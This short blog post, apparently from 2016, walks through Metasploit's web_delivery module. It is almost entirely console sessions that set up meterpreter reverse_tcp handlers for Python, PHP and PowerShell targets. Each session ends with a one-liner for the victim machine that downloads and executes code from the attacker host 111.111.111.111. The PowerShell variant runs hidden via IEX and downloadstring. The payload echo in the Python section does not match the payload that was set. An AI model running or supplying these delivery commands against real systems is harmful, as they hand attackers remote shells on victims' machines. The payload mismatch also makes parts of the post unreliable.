---
title: Web_Delivery with Metasploit
date: 2016-10-14 12:13:27
tags: Metasploit
---

### 0x01 Python
```
msf > use exploit/multi/script/web_delivery
msf exploit(web_delivery) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Python
   1   PHP
   2   PSH
msf exploit(web_delivery) > set target 0
target => 0
msf exploit(web_delivery) > set payload python/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(web_delivery) > set LHOST 111.111.111.111
LHOST => 111.111.111.111
msf exploit(web_delivery) > exploit
[*] Exploit running as background job.
[*] Started reverse TCP handler on 0.0.0.0:4444
msf exploit(web_delivery) >
[*] Using URL: http://0.0.0.0:8080/c2pZ0n9EZ
[*] Local IP: http://111.111.111.111:8080/c2pZ0n9EZ
[*] Server started.
[*] Run the following command on the target machine:
python -c "import urllib2; r = urllib2.urlopen('http://111.111.111.111:8080/c2pZ0n9EZ'); exec(r.read());"
```
#### 0x01 PHP
```
msf > use exploit/multi/script/web_delivery
msf exploit(web_delivery) > set target 1
target => 1
msf > set payload php/meterpreter/reverse_tcp
msf exploit(web_delivery) > set LHOST 111.111.111.111
LHOST => 111.111.111.111
msf exploit(web_delivery) > exploit
[*] Exploit running as background job.

[*] Started reverse TCP handler on 111.111.111.111:8081
msf exploit(web_delivery) >
[*] Using URL: http://0.0.0.0:8080/1G1wlPGJjES4k3
[*] Local IP: http://111.111.111.111:8080/1G1wlPGJjES4k3
[*] Server started.
[*] Run the following command on the target machine:
php -d allow_url_fopen=true -r "eval(file_get_contents('http://111.111.111.111:8080/1G1wlPGJjES4k3'));"
```

### 0x03 Window PowerShell
```
msf > use exploit/multi/script/web_delivery
msf exploit(web_delivery) > set target 2
target => 2
msf exploit(web_delivery) > set payload windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(web_delivery) > set LHOST 111.111.111.111
LHOST => 111.111.111.111
msf exploit(web_delivery) > set LPORT 2333
LPORT => 2333
msf exploit(web_delivery) > exploit
[*] Exploit running as background job.

[*] Started reverse TCP handler on 111.111.111.111:2333
[*] Using URL: http://0.0.0.0:8080/5Yk82s
msf exploit(web_delivery) >
[*] Local IP: http://111.111.111.111:8080/5Yk82s
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c $D=new-object net.webclient;$D.proxy=[Net.WebRequest]::GetSystemWebProxy();$D.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $D.downloadstring('http://111.111.111.111:8080/5Yk82s');
```